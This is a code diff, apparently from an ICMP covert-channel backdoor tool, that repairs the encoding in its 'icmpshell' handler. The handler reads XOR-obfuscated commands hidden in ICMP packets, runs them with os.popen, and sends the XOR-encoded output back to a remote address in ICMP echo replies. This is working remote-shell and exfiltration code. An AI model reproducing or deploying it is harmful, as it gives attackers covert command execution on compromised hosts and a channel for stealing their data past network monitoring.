@@ -17,9 +17,11 @@ def dec(payload, xorkey):
     return ret
 
 def enc(payload, xorkey):
-    arr_payload = bytes(payload, 'utf-8')
+    raw = bytes()
     ret_payload = bytes()
-    for byte in arr_payload:
+    for obj in payload:
+        raw += obj.encode()
+    for byte in raw:
         ret_payload += (byte ^ xorkey).to_bytes(1, 'big')
     return ret_payload
 
@@ -39,8 +41,8 @@ def icmpshell(pkt):
         impacket_raw = dec((pkt[Raw].load), 0x13)
         icmppaket = impacket_raw.decode('utf-8', errors='ignore')
         payload = os.popen(icmppaket).readlines()
-        enc(payload, 0x13)
-        icmppacket = (IP(dst=args.destination_ip, ttl=TTL)/ICMP(type=0, id=ICMP_ID)/payload)
+        raw_payload = enc(payload, 0x13)
+        icmppacket = (IP(dst=args.destination_ip, ttl=TTL)/ICMP(type=0, id=ICMP_ID)/raw_payload)
         sr(icmppacket, timeout=0, verbose=0)
     else:
         pass
